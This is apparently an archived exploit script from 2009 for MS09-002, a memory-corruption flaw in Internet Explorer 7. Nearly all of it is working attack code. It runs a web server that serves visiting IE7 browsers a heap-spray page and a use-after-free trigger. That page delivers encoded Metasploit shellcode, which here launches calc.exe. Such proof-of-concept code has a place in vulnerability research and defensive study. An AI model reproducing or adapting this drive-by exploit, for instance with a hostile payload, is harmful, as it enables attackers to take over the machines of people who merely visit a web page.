#
#   Author : Ahmed Obied (ahmed.obied@gmail.com)
#
#   - Based on the code found by str0ke in the wild for MS09-002
#   - Tested using Internet Explorer 7.0.5730.11 on Windows XP SP2
#
#   Usage  : python ie_ms09002.py [port]
#       

import sys, socket
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler

class RequestHandler(BaseHTTPRequestHandler):

    def get_payload(self):
        # win32_exec - EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub 
        # http://metasploit.com
        payload  = '\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x6f'
        payload += '\x02\xb1\x0e\x83\xeb\xfc\xe2\xf4\x93\xea\xf5\x0e\x6f\x02\x3a\x4b'
        payload += '\x53\x89\xcd\x0b\x17\x03\x5e\x85\x20\x1a\x3a\x51\x4f\x03\x5a\x47'
        payload += '\xe4\x36\x3a\x0f\x81\x33\x71\x97\xc3\x86\x71\x7a\x68\xc3\x7b\x03'
        payload += '\x6e\xc0\x5a\xfa\x54\x56\x95\x0a\x1a\xe7\x3a\x51\x4b\x03\x5a\x68'
        payload += '\xe4\x0e\xfa\x85\x30\x1e\xb0\xe5\xe4\x1e\x3a\x0f\x84\x8b\xed\x2a'
        payload += '\x6b\xc1\x80\xce\x0b\x89\xf1\x3e\xea\xc2\xc9\x02\xe4\x42\xbd\x85'
        payload += '\x1f\x1e\x1c\x85\x07\x0a\x5a\x07\xe4\x82\x01\x0e\x6f\x02\x3a\x66'
        payload += '\x53\x5d\x80\xf8\x0f\x54\x38\xf6\xec\xc2\xca\x5e\x07\x7c\x69\xec'
        payload += '\x1c\x6a\x29\xf0\xe5\x0c\xe6\xf1\x88\x61\xd0\x62\x0c\x2c\xd4\x76'
        payload += '\x0a\x02\xb1\x0e';
        return self.convert_to_utf16(payload)
        
    def get_exploit(self):
        exploit = '''
    
        function spray_heap()
        {
            var payload = unescape("<PAYLOAD>");
                        
            var ret = 0x0c0c0c0c;
            var heap_chunk_size = 0x40000;
            
            var nopsled_size = heap_chunk_size - (payload.length * 2)
            var nopsled = unescape("%u0c0c%u0c0c");
            while (nopsled.length < nopsled_size)
                nopsled += nopsled;
                 
            heap_chunks = new Array();
            heap_chunks_num = (ret - heap_chunk_size)/heap_chunk_size;
            for (var i = 0 ; i < heap_chunks_num ; i++)
                heap_chunks[i] = nopsled + payload;
        }
                
        function trigger_bug() 
        {
            var obj = document.createElement("table");
            obj.click;
            
            var obj_cp = obj.cloneNode();
            obj.clearAttributes();
            obj = null;
            
            CollectGarbage();
           
            var img = document.createElement("img");
            img.src = unescape("%u0c0c%u0c0cCCCCCCCCCCCCCCCCCCCCCC");
	        
	        obj_cp.click;
        }
        
        if (navigator.userAgent.indexOf("MSIE 7") != -1) {
            spray_heap();
            trigger_bug()       
        } else
            window.location = "about:blank"
       
        '''
        exploit = exploit.replace('<PAYLOAD>', self.get_payload())
        exploit = '<html><body><script>' + exploit + '</script></body></html>'
        return exploit

    def convert_to_utf16(self, payload):
        # From Beta v2.0 by Berend-Jan Wever
        # http://www.milw0rm.com/exploits/656
        enc_payload = ''
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i+j]) & 0xff) << (j*8)
            enc_payload += '%%u%04x' % num
        return enc_payload
            
    def log_request(self, *args, **kwargs):
        pass

    def do_GET(self):
        print '[-] Incoming connection from %s' % self.client_address[0]
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        print '[-] Sending exploit to %s ...' % self.client_address[0],
        self.wfile.write(self.get_exploit())
        print 'done'

def main():
    if len(sys.argv) != 2:
        print 'Usage: %s [port]' % sys.argv[0]
        sys.exit(1)
    port = None
    try:
        port = int(sys.argv[1])
        if port < 1 or port > 65535:
            raise ValueError
    except ValueError:
        print '[*] ERROR: invalid port number ...'
        sys.exit(-1)
    try:
        serv = HTTPServer(('', port), RequestHandler)
        ip = socket.gethostbyname(socket.gethostname())
        print '[-] Web server is running at http://%s:%d/' % (ip, port)
    except socket.error:
        print '[*] ERROR: a socket error has occurred ...'
        sys.exit(-1)
    try:
        serv.serve_forever()
    except KeyboardInterrupt:
        print '[-] Exiting ...' 
            
if __name__ == '__main__':
    main()

# milw0rm.com [2009-03-04]
